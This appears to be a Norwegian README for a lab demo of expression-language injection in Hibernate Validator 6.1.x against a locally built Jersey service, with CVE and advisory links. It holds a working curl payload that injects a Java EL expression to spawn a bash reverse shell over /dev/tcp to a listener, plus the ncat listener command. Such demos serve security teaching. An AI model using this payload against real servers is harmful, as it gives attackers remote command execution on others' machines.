# postnr - enkelt innbrudd i Hibernate Validator 6.1.x

## Demo ##

Tre terminaler:
1. `ncat -lkvp 31338`
2. `mvn clean package exec:java`
3. `curl -vv -G --data-urlencode 'name=${"".getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null).exec(["bash", "-c", "exec 5<>/dev/tcp/192.168.10.138/31338;cat <&5 | while read line; do $line 2>&5 >&5;done"].toArray("".split(","))).waitFor()}' http://localhost:8080/postnr`

Merk at IP-adressen i terminal 3 må matche IP-adressen til lokal maskin.

I terminal 1 kan man nå skrive vanlige bash-kommandore og eksekvere dem på maskinen som kjører i terminal 2.

## Kommentarer
Må bruke 6.1.x-versjonene.
6.2.x og 7.0.x legger begrensning på EL-tolkningen og defaulter til å ikke kunne kalle metoder. Se detaljer: https://in.relation.to/2021/01/06/hibernate-validator-700-62-final-released/,

CVE: https://in.relation.to/2020/05/07/hibernate-validator-615-6020-released/

### Netflix

* https://securitylab.github.com/advisories/GHSL-2020-027-netflix-conductor/
* https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-9296

### Tidlig oppdagelse

http://danamodio.com/appsec/research/spring-remote-code-with-expression-language-injection/

## Generert kode:

Koden er generert med
```shell
mvn archetype:generate -DarchetypeArtifactId=jersey-quickstart-grizzly2 \
-DarchetypeGroupId=org.glassfish.jersey.archetypes -DinteractiveMode=false \
-DgroupId=com.example -DartifactId=simple-service -Dpackage=com.example \
-DarchetypeVersion=2.33
```

Fra https://eclipse-ee4j.github.io/jersey.github.io/documentation/latest/getting-started.html

## Dokumentasjon

Java EE Expression Language: https://javaee.github.io/tutorial/jsf-el.html#GJDDD

Hibernate Validator: https://docs.jboss.org/hibernate/validator/6.1/reference/en-US/html_single/
